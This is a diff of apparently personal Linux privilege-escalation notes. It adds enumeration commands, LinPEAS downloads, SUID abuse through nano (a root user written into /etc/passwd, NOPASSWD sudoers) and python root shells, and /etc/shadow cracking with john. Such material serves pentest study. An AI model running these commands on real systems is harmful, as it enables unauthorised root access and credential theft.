@@ -12,10 +12,10 @@ The most common ways of privilege escalation on Linux systems are leveraging ker
 • Networking information
 • Applications and services
 • Files and file systems
-• 
-• 
-• 
-• 
+• Automated Scripts
+• Exploiting SUID Permissions
+• Exploiting SGID permissions
+• LD_PRELOAD
 • 
 • 
 • 
@@ -111,6 +111,165 @@ find /* -user root -perm -4000 -print 2>/dev/null
 
 -- Files and file systems --
 
+⇒ Check for unmounted file systems
+
+cat /etc/fstab
+
+mount | column -t
+awk '$1 !~ /^#/ && $1 != "" {print $1, $2, $3}' /etc/fstab
+grep -i cifs /etc/fstab
+
+⇒ Find files and directories that have world writable permissions
+
+find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
+find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
+find / \( -wholename '/home/homedir/*' -prune -o -wholename  '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';'  2>/dev/null
+
+find /etc -perm -2 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+getcap -r / 2>/dev/null
+
+
+-- Automated Scripts --
+
+Automated vulnerability scanners and scripts usually rely on a database of known vulnerabilities which is only as valid as the last update.
+Another limitation of scripts is that they are generally considered ‘dumb’. They are programmed only to perform a given series of checks and nothing more. 
+
+• LinPEAS
+• Linux privilege escalation checker
+• Unix-privesc-check v1.4
+
+
+➜ LinPEAS – Linux Privilege Escalation Awesome Script 
+
+An interesting thing to note here is the legend printed at the top of the script output which indicates the colours that are used to mark important output. In the output that follows it is important to pay special attention to the red and red/yellow text which mark privilege escalation vectors and important things we must look at.
+
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+./linpeas.sh -h
+./linpeas.sh
+
+➜ Linux privilege escalation checker
+
+The result of this script is a list of local privilege escalation exploits that may apply to the system. 
+
+wget http://www.securitysift.com/download/linuxprivchecker.py
+
+python linuxprivchecker.py
+
+➜ Unix-privesc-check
+
+This tools try to find misconfigurations that will permit local unprivileged users to escalate their privileges to root.
+
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+./unix-privesc-check standard
+./unix-privesc-check detailed
+
+
+-- Exploiting SUID Permissions --
+
+• Nano
+• Python
+• Cat
+
+➜ Nano
+
+SUID stands for ‘set user ID‘ and is a Linux feature that allows low privileged users to execute a file as the file owner.
+
+chmod u+s /bin/nano
+
+find /* -user root -perm -4000 -print 2>/dev/null
+ls -ls | grep nano
+nano /etc/passwd
+
+perl -e 'print crypt("YourPasswd", "salt"),"\n"'
+perl -e 'print crypt("pom", "pom"),"\n"'
+pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
+su pom
+
+The passwd file is a text-based database of user records and is located in the /etc directory. 
+root:x:0:0:root:/root:/bin/bash
+
+/ETC/PASSWD FILE EXPLAINED
+==========================
+
+root:x:0:0:root:/root:/bin/bash
+|   | | | |    |     |        |
+|   | | | |    |     |        +----- 7. Command-line shell
+|   | | | |    |     +-------------- 6. Home directory path
+|   | | | |    +-------------------- 5. GECOS field (user info)
+|   | | | +------------------------- 4. Group identifier (GID)
+|   | | +--------------------------- 3. User identifier (UID)
+|   | +----------------------------- 2. Password placeholder
+|   +------------------------------- 1. Username
+
+
+1. Username.
+2. Password. The ‘x’ means that the actual password is stored in the shadow password file. You can replace the x with a cryptographic hash from the password and a salt.
+3. User identifier.
+4. Group identifier, contains the primary user group.
+5. Gecos field, a user record containing information about the user such as the full name.
+6. Path to the home directory.
+7. Command line shell when the user logs in.
+
+⇒ Modify the sudoers file and give the current privileged user (in this example user sam) permission to execute sudo commands without a password
+
+/etc/sudoers
+
+Defaults    env_reset
+Defaults    mail_badpass
+Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+# Host alias specification
+# User alias specification
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+sam     ALL=(ALL:ALL) NOPASSWD:ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "@include" directives:
+@includedir /etc/sudoers.d
+
+sudo id
+
+➜ Python
+
+find /usr/bin/* -user root -perm -4000 -print 2>/dev/null
+/usr/bin/python2.7
+/usr/bin/python3.9
+
+/usr/bin/python3.9 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+➜ Cat
+
+Read access as root can be used for privilege escalation, for example to read files that are only accessible by root. A good example of such a file is /etc/shadow, a file that stores actual passwords in an encrypted format.
+In the /etc/shadow file we find a couple users with encrypted passwords, which is the root user and sam.
+
+find /usr/bin/* -user root -perm -4000 -print 2>/dev/null
+cat /etc/shadow
+
+cat /etc/passwd | grep -E "root:x:|sam:x:" > passwd.txt
+cat /etc/shadow | grep -E "root:|sam:" > shadow.txt
+
+unshadow passwd.txt shadow.txt > unshadowed.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+
+-- Exploiting SGID permissions --
+
+The set-group identification (SGID) permission is similar to the SUID permission except that it applies to groups instead of users.
+On the GTFOBins website you can find an overview of all Unix binaries that can be used to bypass local security restrictions in misconfigured systems. 
+
+find / -type d -perm -02000
+
+
+-- LD_PRELOAD --
 
 
 
@@ -144,9 +303,69 @@ find /* -user root -perm -4000 -print 2>/dev/null
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- Links --
 
 https://www.exploit-db.com/
 https://www.exploit-db.com/searchsploit
+
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+https://gtfobins.github.io/
+https://www.redhat.com/en/blog/suid-sgid-sticky-bit
+
+https://book.hacktricks.wiki/en/index.html
 
 
 *
